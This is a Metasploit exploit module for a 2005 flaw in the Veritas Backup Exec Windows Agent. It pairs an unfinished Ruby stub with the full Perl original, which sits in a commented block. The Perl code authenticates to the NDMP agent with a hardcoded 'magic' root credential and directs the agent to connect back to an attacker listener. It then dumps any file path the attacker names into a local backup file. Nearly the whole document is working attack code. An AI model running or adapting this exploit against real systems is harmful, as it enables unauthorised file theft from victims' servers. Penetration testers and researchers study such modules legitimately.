require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Veritas Backup Exec Windows Remote File Access',
			'Description'    => %q{
				This module abuses a logic flaw in the Backup Exec Windows
				Agent to download arbitrary files from the system. This flaw
				was found by someone who wishes to remain anonymous and
				affects all known versions of the Backup Exec Windows Agent.
				The output file is in 'MTF' format, which can be extracted
				by the 'NTKBUp' program listed in the references section.
					
			},
			'Author'         => [ 'anonymous' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '14551'],
					[ 'URL', 'http://www.fpns.net/willy/msbksrc.lzh'],
					[ 'MIL', '88'],

				],
			'Privileged'     => true,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 12 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

##
# Original code written by <CENSORED> and ported to the Framework by HDM
##

package Msf::Exploit::backupexec_dump;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use IO::Socket;
use IO::Select;

my $advanced = { };

my $info =
  {
	'Name'  	=> 'Veritas Backup Exec Windows Remote File Access',
	'Version'  	=> '$Revision$',
	'Authors' 	=> [ 'anonymous' ],
	'Arch'  	=> [ ],
	'OS'    	=> [ ],

	'UserOpts'	=>
	  {
		'RHOST' => [1, 'ADDR', 'The target IP address'],
		'RPORT' => [1, 'PORT', 'The target NDMP port', 10000],
		'RPATH' => [0, 'DATA', 'The remote file path to obtain'],
		
		'LHOST' => [1, 'ADDR', 'The local IP address', '0.0.0.0'],
		'LPORT' => [1, 'PORT', 'The local listner port', 44444],
		'LPATH' => [0, 'DATA', 'The local backup file path'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module abuses a logic flaw in the Backup Exec Windows Agent to download
arbitrary files from the system. This flaw was found by someone who wishes to
remain anonymous and affects all known versions of the Backup Exec Windows Agent. The 
output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program 
listed in the references section.
}),

	'Refs' =>
	  [
	  	['BID', '14551'],
		['URL', 'http://www.fpns.net/willy/msbksrc.lzh'],
		['MIL', '88'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Veritas Remote File Access'],
	  ],

	'Keys' => ['veritas'],

	'DisclosureDate' => 'Aug 12 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $remote_host = $self->GetVar('RHOST');
	my $remote_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $remote_host,
		'PeerPort'  => $remote_port,
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error connecting to Veritas agent: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}

	my $res;
	my $pkt;
	
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive greeting from the agent');
		$s->Close;
		return $self->CheckCode('Unknown');
	}

	my $username = "root";
	my $password = "\xb4\xb8\x0f\x26\x20\x5c\x42\x34\x03\xfc\xae\xee\x8f\x91\x3d\x6f"; 

	# Create the CONNECT_CLIENT_AUTH request
	$pkt =
	  pack('N', 1).
	  pack('N', time()).
	  pack('N', 0).
	  pack('N', 0x0901).
	  pack('N', 0).
	  pack('N', 0).
	  pack('N', 2).
	  pack('N', length($username)).
	  $username.
	  $password;

	$self->PrintLine( "[*] Sending magic authentication request...");
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	$s->Close;
	
	if (! $res) {
		$self->PrintLine('[*] Did not receive authentication response');
		return $self->CheckCode('Safe');	
	}

	my @words = unpack('N*', $res);
	
	if (
		$words[2] == 1 && 
		$words[3] == 0x0901 &&
	 	$words[5] == 0 &&
	  	$words[6] == 0
	   ) {
		$self->PrintLine('[*] This system appears to be vulnerable');
		return $self->CheckCode('Appears');
	}
	
	$self->PrintLine('[*] This system does not appear to be vulnerable');
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self        = shift;
	my $remote_host = $self->GetVar('RHOST');
	my $remote_port = $self->GetVar('RPORT');
	my $remote_path = $self->GetVar('RPATH');

	my $local_host  = $self->GetVar('LHOST');
	my $local_port  = $self->GetVar('LPORT');
	my $local_path  = $self->GetVar('LPATH');
	
	
	if (! $local_path) {
		$self->PrintLine("[*] Please specify a local file name for the LPATH option");
		return;
	}

	if (! $remote_path) {
		$self->PrintLine("[*] Please specify a remote file path for the RPATH option");
		return;
	}
		
	$self->PrintLine( "[*] Attempting to retrieve $remote_path...");

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $remote_host,
		'PeerPort'  => $remote_port,
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error connecting to Veritas agent: ' . $s->GetError );
		return;
	}

	my $res;
	my $pkt;
	
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive greeting from the agent');
		$s->Close;
		return;
	}

	my $username = "root";
	my $password = "\xb4\xb8\x0f\x26\x20\x5c\x42\x34\x03\xfc\xae\xee\x8f\x91\x3d\x6f"; 

	# Create the CONNECT_CLIENT_AUTH request
	$pkt =
	  pack('N', 1).
	  pack('N', time()).
	  pack('N', 0).
	  pack('N', 0x0901).
	  pack('N', 0).
	  pack('N', 0).
	  pack('N', 2).
	  pack('N', length($username)).
	  $username.
	  $password;

	$self->PrintLine( "[*] Sending magic authentication request...");
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive authentication response');
		return;
	}

	$self->PrintLine("[*] Starting the data connection listener on $local_port...");
	my $l = IO::Socket::INET->new
	  (
		'LocalPort' => $local_port,
		'Proto'     => 'tcp',
		'ReuseAddr' => 1,
		'Listen'    => 5,
		'Blocking'  => 0,
	  );
	
	if (! $l) {
		$self->PrintLine("[*] Failed to start the listener: $!");
		return;
	}
	
	my $sel = IO::Select->new($l);
	
	if ($local_host eq "0.0.0.0") {
		$local_host = $s->Socket->sockhost;
	}
	
	# Create the DATA_CONNECT request
	$pkt =
		pack('NNNNNNN',
			3,
			0,
			0,
			0x040a,
			0,
			0,
			1
		).
		gethostbyname($local_host).
		pack('N', $local_port);
		
	$self->PrintLine("[*] Directing the server to $local_host:$local_port...");
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive data connect response');
		return;
	}

	$self->PrintLine("[*] Waiting 15 seconds for the agent to connect...");
	my @rdy = $sel->can_read(15);
	if (! @rdy) {
		$self->PrintLine("[*] No connection received from the agent :-(");
		return;
	}
	
	my $cli = $l->accept();
	if (! $cli) {
		$self->PrintLine("[*] Encountered an error accepting the connection: $!");
		return;
	}
	
	my $d = Msf::Socket::Tcp->new_from_socket($cli);
	
	$self->PrintLine("[*] Connection received from ".$d->PeerAddr." :-)");
	
	# Create the MOVER_SET_RECORD_SIZE request
	$pkt= 
		pack('NNNNNNN',
			4,
			0,
			0,
			0x0a08,
			0,
			0,
			0x8000,
		);
		
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive mover set response');
		return;
	}

	# The environment needed to perform the actual backup
	my %define_env =
	(
		'USERNAME'                => '',
		'BU_EXCLUDE_ACTIVE_FILES' => "0",
		'FILESYSTEM'              => "\"\\\\$remote_host\\$remote_path\",v0,t0,l0,n0,f0",
	);

	# Create the DATA_START_BACKUP request
	$pkt =
		pack('NNNNNNN',
			5,
			0,
			0,
			0x0401,
			0,
			0,
			4,
		).
		"dump".
		pack("N", scalar(keys %define_env));
	
	foreach my $var (keys %define_env) {
		
		$pkt .= pack("N", length($var));
		$pkt .= $var;
		if (length($var) % 4) {
			$pkt .= "\x00" x (4 - (length($var) % 4));
		}
		
		$pkt .= pack("N", length($define_env{$var}));
		$pkt .= $define_env{$var};
		if (length($define_env{$var}) % 4) {
			$pkt .= "\x00" x (4 - (length($define_env{$var}) % 4));
		}
	}	

	substr($pkt, -1, 1) = "\x01";
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive backup start response');
		return;
	}

	# Create the GET_ENV request
	$pkt =
		pack('NNNNNN',
			5,
			0,
			0,
			0x4004,
			0,
			0,
		);

	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine('[*] Did not receive get env response');
		return;
	}

	if (! open(TMP, ">". $local_path)) {
		$self->PrintLine("[*] Could not open local file for writing: $!");
		return;
	}
	
	my $data;
	do 
	{
		$data = $d->Recv(524288, 10);
		if ($data) {
			$self->PrintLine("[*] Obtained ".length($data)." bytes from the agent");
			print TMP $data;
		}
		else {
			$self->PrintLine("[*] Reached the end of the backup data");
		}
		
	} while ($data);
	close(TMP);
			
	return;
};

sub AgentRead {
	my $self = shift;
	my $sock = shift;
	my $rlen = $sock->Recv(4, 10);
	return if ! $rlen;
	
	my $plen = unpack('N', $rlen);
	return if ! $plen;
	
	my $data = $sock->Recv($plen & 0x7fffffff, 10);
	return $data;
}

sub AgentSend {
	my $self = shift;
	my $sock = shift;
	my $data = shift;
	return if ! $data;
	return $sock->Send(pack('N', 0x80000000 + length($data)) . $data);
}

1;

=end


end
end	
